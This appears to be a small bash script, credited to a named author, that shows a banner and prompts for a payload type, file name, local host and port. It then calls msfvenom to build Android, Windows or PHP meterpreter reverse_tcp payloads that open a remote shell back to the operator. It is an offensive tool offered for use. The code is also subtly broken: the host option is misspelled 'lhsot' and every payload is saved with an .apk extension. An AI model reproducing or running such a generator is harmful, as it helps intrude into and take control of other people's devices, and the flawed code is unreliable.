apt install pv
clear
echo "-----           -----" | pv -qL 90
echo "--   --       ---------  " | pv -qL 90
echo "--   ---    --         --" | pv -qL 90
echo "-------    ---         ---" | pv -qL 90
echo "---        ---         ---" | pv -qL 90
echo "---        ---         ---" | pv -qL 90
echo "---        ---         ---" | pv -qL 90
echo "---         --         --" | pv -qL 90
echo "---           --------- " | pv -qL 90
echo "---             -----" | pv -qL 90
echo 
echo "==============================" | pv -qL 70
echo "==============================" | pv -qL 70
echo 
echo "[1] android/meterpreter/reverse_tcp" 
echo 
echo "[2] windows/meterpreter/reverse_tcp" 
echo 
echo "[3] php/meterpreter/reverse_tcp" 
echo  
read -p "Choose from options >> " choose 
echo 
read -p "Type the name of your payload >> " name
echo  
read -p "Type your local host >> " ip
echo 
read -p "Type your local port >> " port 
echo  
if [ $choose -eq 1 ]
then 
	msfvenom -p android/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.apk
	clear
	echo "Your android payload has been created ! "
fi


 
if [ $choose -eq 2 ]
then 
        msfvenom -p windows/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.apk
        clear
        echo "Your windows payload has been created ! "
fi


if [ $choose -eq 3 ]
then 
        msfvenom -p php/meterpreter/reverse_tcp lhsot=$ip lport=$port > $name.apk
        clear
        echo "Your php payload has been created ! "
fi
echo "===============================" | pv -qL 30
echo 
echo "Created by Yousef El-Halafawy" | pv -qL 15
echo
echo "===============================" | pv -qL 30
